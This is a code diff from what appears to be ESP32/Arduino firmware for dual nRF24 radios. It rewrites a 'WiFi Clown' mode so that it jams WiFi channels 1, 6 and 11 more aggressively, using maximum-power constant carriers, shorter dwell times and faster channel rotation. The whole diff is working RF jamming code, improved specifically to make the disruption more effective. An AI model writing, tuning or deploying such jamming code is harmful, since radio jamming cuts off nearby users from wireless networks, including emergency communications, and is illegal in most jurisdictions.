@@ -6369,52 +6369,70 @@ if (beaconAnalyzerActive) {
         break;
         
       case NRF_WIFI_CLOWN:
-        // WiFi channel jamming - controlled timing for maximum effectiveness
-        static unsigned long lastWiFiHop = 0;
-        unsigned long currentMicros = micros();
-        
-        // Only change every 20ms (20000 microseconds) for optimal WiFi disruption
-        if (currentMicros - lastWiFiHop >= 20000) {
-          lastWiFiHop = currentMicros;
-          
-          // Select current WiFi channel sweep array
-          const byte* sweep;
-          switch (wifi_jam_mode) {
-            case 0: sweep = wifi_ch1_sweep; break;   // WiFi Ch 1 (2412 MHz)
-            case 1: sweep = wifi_ch6_sweep; break;   // WiFi Ch 6 (2437 MHz)
-            case 2: sweep = wifi_ch11_sweep; break;  // WiFi Ch 11 (2462 MHz)
-            default: 
-              wifi_jam_mode = 0;
-              sweep = wifi_ch1_sweep;
-          }
-          
-          // Radio 1: Primary sweep position
-          if (nrf1Available) {
-            radio1.setChannel(sweep[sweep_index_radio1]);
-            sweep_index_radio1 = (sweep_index_radio1 + 1) % 6;
-          }
-          
-          // Radio 2: Offset sweep position (covers different frequencies)
-          if (nrf2Available) {
-            radio2.setChannel(sweep[sweep_index_radio2]);
-            sweep_index_radio2 = (sweep_index_radio2 + 1) % 6;
-          }
-          
-          nrfJamPackets += (nrf1Available ? 1 : 0) + (nrf2Available ? 1 : 0);
-          
-          // Rotate to next WiFi channel every 100 hops (~2 seconds per channel)
-          if ((nrfJamPackets % 100) == 0 && nrfJamPackets > 0) {
-            wifi_jam_mode = (wifi_jam_mode + 1) % 3;
-            sweep_index_radio1 = 0;
-            sweep_index_radio2 = 3;  // Offset for dual coverage
-            
-            const char* channel_name = (wifi_jam_mode == 0) ? "WiFi Ch1 (2412MHz)" :
-                                       (wifi_jam_mode == 1) ? "WiFi Ch6 (2437MHz)" :
-                                                               "WiFi Ch11 (2462MHz)";
-            Serial.printf("[WiFi Clown] Now jamming: %s\n", channel_name);
-          }
-        }
-        break;
+  // âš¡âš¡âš¡ MAXIMUM POWER WiFi Clown V2 - Cifer-Tech Style âš¡âš¡âš¡
+  // CRITICAL: Stop carrier, change channel, restart carrier (proper RF-Clown method)
+  
+  static unsigned long lastWiFiHop = 0;
+  unsigned long currentMicros = micros();
+  
+  // âš¡ FASTER DWELL: 10ms per channel (not 20ms) for more aggressive jamming
+  if (currentMicros - lastWiFiHop >= 10000) {  // 10ms = 10000 microseconds
+    lastWiFiHop = currentMicros;
+    
+    // Select current WiFi channel sweep array
+    const byte* sweep;
+    switch (wifi_jam_mode) {
+      case 0: sweep = wifi_ch1_sweep; break;   // WiFi Ch 1 (2412 MHz)
+      case 1: sweep = wifi_ch6_sweep; break;   // WiFi Ch 6 (2437 MHz)
+      case 2: sweep = wifi_ch11_sweep; break;  // WiFi Ch 11 (2462 MHz)
+      default: 
+        wifi_jam_mode = 0;
+        sweep = wifi_ch1_sweep;
+    }
+    
+    // âš¡âš¡âš¡ CRITICAL FIX: Restart carrier on EACH channel (RF-Clown method) âš¡âš¡âš¡
+    
+    // === RADIO 1: Stop, Change, Restart Carrier ===
+    if (nrf1Available) {
+      radio1.stopConstCarrier();           // Stop old carrier
+      delayMicroseconds(50);               // Brief pause
+      radio1.setChannel(sweep[sweep_index_radio1]);  // New channel
+      delayMicroseconds(50);               // Settle time
+      radio1.startConstCarrier(RF24_PA_MAX, sweep[sweep_index_radio1]);  // New carrier
+      
+      sweep_index_radio1 = (sweep_index_radio1 + 1) % 6;  // Next position
+    }
+    
+    // === RADIO 2: Stop, Change, Restart Carrier (offset pattern) ===
+    if (nrf2Available && dualNRFMode) {
+      radio2.stopConstCarrier();           // Stop old carrier
+      delayMicroseconds(50);               // Brief pause
+      radio2.setChannel(sweep[sweep_index_radio2]);  // New channel
+      delayMicroseconds(50);               // Settle time
+      radio2.startConstCarrier(RF24_PA_MAX, sweep[sweep_index_radio2]);  // New carrier
+      
+      sweep_index_radio2 = (sweep_index_radio2 + 1) % 6;  // Next position (offset)
+    }
+    
+    // Count hops (dual radio gets 2x credit)
+    nrfJamPackets += (nrf1Available ? 1 : 0) + (nrf2Available && dualNRFMode ? 1 : 0);
+    
+    // âš¡ FASTER ROTATION: Switch WiFi channel every 60 hops (~600ms per WiFi channel)
+    if ((nrfJamPackets % 60) == 0 && nrfJamPackets > 0) {
+      wifi_jam_mode = (wifi_jam_mode + 1) % 3;
+      sweep_index_radio1 = 0;
+      sweep_index_radio2 = 3;  // Keep offset for dual coverage
+      
+      // Optional: Print which WiFi channel we're jamming
+      if ((nrfJamPackets % 300) == 0) {  // Print every 5th rotation
+        const char* channel_name = (wifi_jam_mode == 0) ? "Ch1 (2412MHz)" :
+                                   (wifi_jam_mode == 1) ? "Ch6 (2437MHz)" :
+                                                           "Ch11 (2462MHz)";
+        Serial.printf("[WiFi Clown] Now jamming: %s\n", channel_name);
+      }
+    }
+  }
+  break;
     }
     
     // ⚡ Stats every 200K hops (less frequent = faster jamming)
